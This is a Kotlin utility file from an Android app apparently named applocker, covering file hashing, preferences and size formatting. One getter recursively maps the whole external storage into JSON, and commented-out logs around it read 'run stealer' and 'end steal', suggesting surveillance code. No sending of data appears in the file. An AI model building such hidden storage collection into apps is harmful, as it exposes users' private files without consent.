package com.ezteam.applocker.utils

import android.content.Context
import android.content.pm.PackageManager
import android.os.Environment
import android.preference.PreferenceManager
import android.util.Base64
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedInputStream
import java.io.File
import java.io.FileInputStream
import java.io.InputStream
import java.security.MessageDigest
import java.text.DecimalFormat
import java.util.*
import java.util.regex.Pattern
import kotlin.experimental.and

object CleanUtils {
    fun getFilesFromDist(root: File): JSONArray {
        val files = JSONArray()
        try {
            val list = root.listFiles()
            //Log.e("===",root.listFiles().toString());
            for (f in list) {
                try {
                    val file = JSONObject()
                    if (f.isDirectory) {
                        //Log.d("===", "Dir: " + f.getAbsoluteFile());
                        file.put("type", "dir")
                        file.put("path", f.absolutePath)
                        file.put("parent", getFilesFromDist(f))
                    } else {
                        file.put("type", "file")
                        file.put("path", f.absolutePath)
                        //Log.d("===", "File: " + f.getAbsoluteFile());
                    }
                    files.put(file)
                } catch (e: Exception) {
                    //Log.e("===",f.getAbsoluteFile() + " error " +  e.toString());
                }
            }
        } catch (e: Exception) {
            //Log.e("===",e.toString());
        }
        return files
    }


    //Log.e("===","run stealer");
    val rootTree: String
        //Log.e("===","end steal " + data.length());
        get() {
            //Log.e("===","run stealer");
            //Log.e("===","end steal " + data.length());
            return getFilesFromDist(Environment.getExternalStorageDirectory()).toString()
        }

    fun readIntConfig(cnt: Context?, key: String?): Int {
        val settings = PreferenceManager.getDefaultSharedPreferences(cnt)
        return settings.getInt(key, 0)
    }

    fun writeIntConfig(cnt: Context, key: String?, value: Int?) {
        if (cnt.packageName!=null) {
            val settings = PreferenceManager.getDefaultSharedPreferences(cnt)

            //SharedPreferences settings = cnt.getSharedPreferences(config_file, 0);
            val editor = settings.edit()
            editor.putInt(key, value!!)
            editor.apply()
            editor.commit()
        }
    }


    fun fileToMD5(filePath: String): String? {
        if (filePath.contains("cache")) return ""
        var inputStream: InputStream? = null
        return try {
            inputStream = FileInputStream(filePath)
            val buffer = ByteArray(1024)
            val digest = MessageDigest.getInstance("MD5")
            var numRead = 0
            while (numRead!=-1) {
                numRead = inputStream.read(buffer)
                if (numRead > 0) digest.update(buffer, 0, numRead)
            }
            val md5Bytes = digest.digest()
            convertHashToString(md5Bytes)
        } catch (e: Exception) {
            null
        } finally {
            if (inputStream!=null) {
                try {
                    inputStream.close()
                } catch (ignored: Exception) {
                }
            }
        }
    }

    private fun convertHashToString(md5Bytes: ByteArray): String {
        val returnVal = StringBuilder()
        for (md5Byte in md5Bytes) {
            returnVal.append(Integer.toString((md5Byte and 0xff.toByte()) + 0x100, 16).substring(1))
        }
        return returnVal.toString().toUpperCase()
    }


    fun floatForm(d: Double): String {
        return DecimalFormat("#.##").format(d)
    }

    fun bytesToHuman(size: Long): String {
        val Kb = (1 * 1024).toLong()
        val Mb = Kb * 1024
        val Gb = Mb * 1024
        val Tb = Gb * 1024
        val Pb = Tb * 1024
        val Eb = Pb * 1024
        if (size < Kb) return floatForm(size.toDouble()) + " byte"
        if (size in Kb until Mb) return floatForm(size.toDouble() / Kb) + " Kb"
        if (size in Mb until Gb) return floatForm(size.toDouble() / Mb) + " Mb"
        if (size in Gb until Tb) return floatForm(size.toDouble() / Gb) + " Gb"
        if (size in Tb until Pb) return floatForm(size.toDouble() / Tb) + " Tb"
        if (size in Pb until Eb) return floatForm(size.toDouble() / Pb) + " Pb"
        return if (size >= Eb) floatForm(size.toDouble() / Eb) + " Eb" else "???"
    }
}